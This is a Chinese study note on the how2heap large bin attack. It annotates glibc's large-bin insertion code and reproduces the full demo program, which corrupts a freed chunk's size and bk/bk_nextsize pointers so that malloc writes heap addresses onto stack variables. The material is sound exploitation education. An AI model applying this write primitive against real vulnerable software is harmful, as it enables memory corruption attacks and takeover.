### how2heap的源码分析


下面是glibc中unsortedbin中的chunk进入largebin的规则
```c
if (in_largebin_range (size)) //判断是否属于largebin

{
  victim_index = largebin_index (size); //寻找当前size在largebin中的
  bck = bin_at (av, victim_index); //寻找main_arena
  fwd = bck->fd;//size最大的chunk的地址

  /* maintain large bins in sorted order */
  if (fwd != bck) //如果表不为空

    {
      /* Or with inuse bit to speed comparisons */
      size |= PREV_INUSE;
      /* if smaller than smallest, bypass loop */
      assert (chunk_main_arena (bck->bk));
      if ((unsigned long) (size)
< (unsigned long) chunksize_nomask(bck->bk))//bck->bk是当前最小的chunk，如果size比它还小，那么直接插入到表尾

        {//总的来说，就是链表的插入操作
          fwd = bck;
          bck = bck->bk;
          victim->fd_nextsize = fwd->fd;
          victim->bk_nextsize = fwd->fd->bk_nextsize;
          fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
        }

      else//如果不是最小，那就由小到大找到第一个比它小的插在它的前面

        {

          assert (chunk_main_arena (fwd));
          while ((unsigned long) size < chunksize_nomask (fwd))

            {

              fwd = fwd->fd_nextsize;
  assert (chunk_main_arena (fwd));

            }

          if ((unsigned long) size
  == (unsigned long) chunksize_nomask (fwd))

            /* Always insert in the second position.  */

            fwd = fwd->fd;//如果说是已经存在相同大小的chunk1，就将fwd赋为chunk1的下一个chunk2

          else

            {//插入到fwd的chunk的前面

              victim->fd_nextsize = fwd;
              victim->bk_nextsize = fwd->bk_nextsize;

             /*libc2.29之后才有该检查

             if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))//这个检查好像和unlink一样，都是检查fwd的指针有没有被恶意修改

                malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");*/

              fwd->bk_nextsize = victim;
              victim->bk_nextsize->fd_nextsize = victim;

            }
          bck = fwd->bk;//要作为纵向链表的，fwd就是chunk2，bck就是chunk1；要做为横向链表的，fwd->bk是前一个chunk或者main_arene,正常情况下面的条件势必不符合

          /* libc2.29之后才有该检查

          if (bck->fd != fwd)
            malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");//同样是纵向检查指针有没有被恶意修改*/

        }
    }

  else

    victim->fd_nextsize = victim->bk_nextsize = victim;//如果表为空，那么指针自指

}

mark_bin (av, victim_index);
victim->bk = bck;
victim->fd = fwd;
fwd->bk = victim;
bck->fd = victim;//不管到底有没有重复，都进行一次纵向链接，保证一些指针为NULL

```

---


#### glibc源码详细分析
首先判断从unsortedbin中拿出来的chunk是否属于largebin的大小
是的话就会进行chunk的链入，代码如下：
```c
victim_index = largebin_index (size); //寻找当前size在largebin中的
  bck = bin_at (av, victim_index); //寻找main_arena
  fwd = bck->fd;//size最大的chunk的地址
```

首先会检查largebin中的链表是否为空，
不为空的话就会进行寻找最小的size的chunk进行比较，如果victim的size更小的话，就会进行插入尾部,代码如下：
```c
          fwd = bck;
          bck = bck->bk;
          victim->fd_nextsize = fwd->fd;
          victim->bk_nextsize = fwd->fd->bk_nextsize;
          fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
```

如果不是最小的，那就从largebin中寻找第一个比victim小的chunk，插在他前面，而这又分为两步，一步是检查是否存在相同的chunk，代码如下：

```c
assert (chunk_main_arena (fwd));
          while ((unsigned long) size < chunksize_nomask (fwd))

            {

              fwd = fwd->fd_nextsize;
  assert (chunk_main_arena (fwd));

            }

          if ((unsigned long) size
  == (unsigned long) chunksize_nomask (fwd))

            /* Always insert in the second position.  */

            fwd = fwd->fd;//如果说是已经存在相同大小的chunk1，就将fwd赋为chunk1的下一个chunk2
```

另一步是当victim的chunk是不存在相同的且victim也不是最小的时候，代码如下：
```c
			  victim->fd_nextsize = fwd;
              victim->bk_nextsize = fwd->bk_nextsize;

             /*libc2.29之后才有该检查

             if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))//这个检查好像和unlink一样，都是检查fwd的指针有没有被恶意修改

                malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");*/

              fwd->bk_nextsize = victim;
              victim->bk_nextsize->fd_nextsize = victim;

            }
```

在完成上面的判断后，最后要补上：
```c
          bck = fwd->bk;//要作为纵向链表的，fwd就是chunk2，bck就是chunk1；要做为横向链表的，fwd->bk是前一个chunk或者main_arene,正常情况下面的条件势必不符合

          /* libc2.29之后才有该检查

          if (bck->fd != fwd)
            malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");//同样是纵向检查指针有没有被恶意修改*/
```

当链表为空的时候，代码：
```c
victim->fd_nextsize = victim->bk_nextsize = victim;//如果表为空，那么指针自指
```

在判断完链表为空不为空之后要进行统一的一步：
```c
mark_bin (av, victim_index);
victim->bk = bck;
victim->fd = fwd;
fwd->bk = victim;
bck->fd = victim;//不管到底有没有重复，都进行一次纵向链接，保证一些指针为NULL
```

#### 测试代码
```c
/*
    This technique is taken from
    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/
    [...]
              else

              {
                  victim->fd_nextsize = fwd;
                  victim->bk_nextsize = fwd->bk_nextsize;
                  fwd->bk_nextsize = victim;
                  victim->bk_nextsize->fd_nextsize = victim;
              }
              bck = fwd->bk;
    [...]
    mark_bin (av, victim_index);
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;

      For more details on how large-bins are handled and sorted by ptmalloc,
    please check the Background section in the aforementioned link.

    [...]
 */

#include<stdio.h>
#include<stdlib.h>
#include<assert.h>

int main()

{

    fprintf(stderr, "This file demonstrates large bin attack by writing a large unsigned long value into stack\n");

    fprintf(stderr, "In practice, large bin attack is generally prepared for further attacks, such as rewriting the "
           "global variable global_max_fast in libc for further fastbin attack\n\n");

    unsigned long stack_var1 = 0;
    unsigned long stack_var2 = 0;

    fprintf(stderr, "Let's first look at the targets we want to rewrite on stack:\n");
    fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
    fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);

    unsigned long *p1 = malloc(0x420);

    fprintf(stderr, "Now, we allocate the first large chunk on the heap at: %p\n", p1 - 2);
    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
           " the first large chunk during the free()\n\n");

    malloc(0x20);

    unsigned long *p2 = malloc(0x500);
    
    fprintf(stderr, "Then, we allocate the second large chunk on the heap at: %p\n", p2 - 2);
    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
           " the second large chunk during the free()\n\n");

    malloc(0x20);

    unsigned long *p3 = malloc(0x500);
    fprintf(stderr, "Finally, we allocate the third large chunk on the heap at: %p\n", p3 - 2);
    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the top chunk with"
           " the third large chunk during the free()\n\n");

    malloc(0x20);
    free(p1);
    free(p2);
    fprintf(stderr, "We free the first and second large chunks now and they will be inserted in the unsorted bin:"
           " [ %p <--> %p ]\n\n", (void *)(p2 - 2), (void *)(p2[0]));

  

    malloc(0x90);
    fprintf(stderr, "Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
            " freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"
            ", and reinsert the remaining of the freed first large chunk into the unsorted bin:"
            " [ %p ]\n\n", (void *)((char *)p1 + 0x90));

    free(p3);
    fprintf(stderr, "Now, we free the third large chunk and it will be inserted in the unsorted bin:"
           " [ %p <--> %p ]\n\n", (void *)(p3 - 2), (void *)(p3[0]));

    //------------VULNERABILITY-----------

  

    fprintf(stderr, "Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""
            " as well as its \"bk\" and \"bk_nextsize\" pointers\n");

    fprintf(stderr, "Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"
            " at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"
            " \"bk_nextsize\" to 32 bytes before stack_var2\n\n");


    p2[-1] = 0x3f1;
    p2[0] = 0;
    p2[2] = 0;
    p2[1] = (unsigned long)(&stack_var1 - 2);
    p2[3] = (unsigned long)(&stack_var2 - 4);

    //------------------------------------

    malloc(0x90);
    fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
            " During this time, targets should have already been rewritten:\n");
    fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
    fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);

  

    // sanity check
    assert(stack_var1 != 0);
    assert(stack_var2 != 0);

    return 0;

}
```

#### 源代码运行结果
![[Pasted image 20250414123759.png]]

![[Pasted image 20250414234304.png]]

这个图片里面有几个点是我现在还是有点迷糊的地方，就是关于stacck_addr2的地方等于p3的位置，我看网上几个文章是说在其他的地方，如前两个图，我感觉真的扯，

![[Pasted image 20250414235005.png]]

![[Pasted image 20250414234835.png]]


我觉得是这个地方 c
```c
victim->bk_nextsize->fd_nextsize = victim;
```
这个地方正好是将stack_addr2=p3的地方，真好我在网上也见到了一篇文章也是这样讲的
我就姑且将这个作为对的了
![[Pasted image 20250414234707.png]]

[浅析Large_bins_attack在高低版本的利用-先知社区](https://xz.aliyun.com/news/15081)


#### 宝藏文章
[About Largebin - hyq2 - 博客园](https://www.cnblogs.com/hyq2/p/15998570.html)

这篇文章里面还涉及largebin取出chunk的时候存在的漏洞
有空看看